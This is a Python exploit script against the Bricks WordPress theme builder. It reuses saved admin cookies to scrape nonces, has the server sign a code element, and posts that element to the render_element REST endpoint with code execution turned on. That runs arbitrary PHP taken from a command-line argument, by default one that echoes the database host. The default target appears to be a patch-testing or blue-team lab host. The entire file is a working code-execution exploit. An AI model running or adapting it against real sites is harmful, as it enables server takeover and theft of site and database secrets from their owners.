#!/usr/bin/env python3
import requests, sys, pickle, re
from bs4 import BeautifulSoup

# Requirements?
# bricks license			dont know
# admin execute code (builder access)	YES
# pretty permalinks			YES (well.. I have that address hard coded)


# Args =)
if len(sys.argv) > 1:
    host=sys.argv[1]
else:
    host="https://vuln-patch.blueteamer.io"
if len(sys.argv) > 2:
    evil_cmd=sys.argv[2]
else:
    evil_cmd='<?php echo DB_HOST; ?>'


# Cookie helpers
def save_cookies(requests_cookiejar, filename):
    with open(filename, 'wb') as f:
        pickle.dump(requests_cookiejar, f)

def load_cookies(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)

def attack_signature(nonce, code):
    data = {
        'action': 'bricks_generate_code_signature',
        'element': '{"id":"alppni","name":"code","parent":0,"children":[],"settings":{"code":"'+code+'","executeCode":true},"themeStyles":{}}',
        'nonce': nonce,
        'postId': '1234',
        'bricks-is-builder': '1',
    }
    res = requests.post(host+'/wp-admin/admin-ajax.php', cookies=load_cookies('_cookies'), data=data)
    json_data = res.json()
    return json_data['data']['element']['settings']['signature']

# Nonce helper
def get_nonce_builder(host):
    html_data = requests.get(host+"/?bricks=run", cookies=load_cookies("_cookies")) #admin 
    soup = BeautifulSoup(html_data.text, 'html.parser')
    bricks_js = soup.find(id='bricks-builder-js-extra')
    nonce = re.search('nonce":"(.*?)",', str(bricks_js))
    return nonce.group(1)

def get_nonce_admin(host):
    html_data = requests.get(host+"/wp-admin/", cookies=load_cookies("_cookies")) #admin 
    soup = BeautifulSoup(html_data.text, 'html.parser')
    bricks_js = soup.find(id='bricks-admin-js-extra')
    nonce = re.search('nonce":"(.*?)",', str(bricks_js))
    return nonce.group(1)

# Attack Nonce
nonce_admin = get_nonce_admin(host)
nonce_builder = get_nonce_builder(host)

# Attack render_element
path="/wp-json/bricks/v1/render_element"
url=host+path
signature = attack_signature(nonce_builder, evil_cmd)
evil_obj_admin = {
    'nonce': nonce_admin,
#    'nonce': 'c53b2dbd50',
    'postId': '1234',
    'action': 'bricks_render_element',
    'element': {
        'id': 'ahavrd',
        'name': 'code',
        'settings': {
            'code': evil_cmd,
            'signature':signature,
            'executeCode': True
        }
    }
}
headers = {
    'x-Bricks-Is-Builder':'1'
} 

print("Attacking: ", host)
print("With admin nonce:", nonce_admin)
print("With signature:", signature)
res = requests.post(url, cookies=load_cookies("_cookies"), json=evil_obj_admin, headers=headers)
print(res.text)
